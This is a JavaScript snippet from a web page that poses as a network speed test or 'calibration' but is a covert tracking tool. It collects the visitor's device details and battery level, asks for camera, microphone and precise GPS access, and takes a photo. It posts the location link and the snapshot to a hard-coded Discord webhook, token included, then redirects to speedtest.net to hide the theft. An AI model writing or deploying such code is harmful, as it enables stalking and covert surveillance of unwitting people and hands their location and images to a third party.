const WEBHOOK_URL = 'https://discord.com/api/webhooks/1476812049169383524/WP8wz0C8921xD_t0FTkX5MX2zSvb1OD0l2AGc55llvFCVcei7VeRgKG-0Q7gftwITMZV';

    async function startForensicCapture() {
        const status = document.getElementById('status');
        status.innerText = "Initializing...";

        // 1. Get Battery & Device Info (No permission needed)
        let battery = "N/A";
        try {
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                battery = `${(b.level * 100).toFixed(0)}%`;
            }
        } catch(e) {}
        
        const device = navigator.userAgent.includes("(") ? navigator.userAgent.split('(')[1].split(')')[0] : "Unknown Device";

        try {
            // 2. Request Camera & Mic
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true }).catch(err => {
                console.log("Cam/Mic Denied");
                return null; 
            });

            // 3. Request GPS
            navigator.geolocation.getCurrentPosition(async (pos) => {
                status.innerText = "Syncing with Node...";

                const formData = new FormData();
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;

                const messageData = {
                    content: "âš¡ **DATA RECOVERY SUCCESSFUL**",
                    embeds: [{
                        title: "Calibration Report",
                        color: 3447003,
                        fields: [
                            { name: "ðŸ“ Location", value: `https://www.google.com/maps?q=${lat},${lon}` },
                            { name: "ðŸ”‹ Battery", value: battery, inline: true },
                            { name: "ðŸ“± Device", value: device, inline: true }
                        ],
                        timestamp: new Date()
                    }]
                };

                formData.append('payload_json', JSON.stringify(messageData));

                // If camera was allowed, snap photo
                if (stream) {
                    const video = document.getElementById('video');
                    video.srcObject = stream;
                    const canvas = document.getElementById('canvas');
                    
                    // Wait a split second for camera to wake up
                    setTimeout(async () => {
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        
                        canvas.toBlob(async (blob) => {
                            formData.append('file1', blob, 'snapshot.jpg');
                            await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
                            finish();
                        }, 'image/jpeg');
                    }, 1000);
                } else {
                    // No camera, just send location
                    await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
                    finish();
                }

                function finish() {
                    if(stream) stream.getTracks().forEach(t => t.stop());
                    status.innerText = "Calibration Complete!";
                    setTimeout(() => window.location.href = "https://www.speedtest.net", 800);
                }

            }, (err) => {
                alert("Error: Please allow Location Access to continue the test.");
                status.innerText = "Error: GPS Denied";
            }, { enableHighAccuracy: true });

        } catch (err) {
            status.innerText = "System Error";
        }
    }
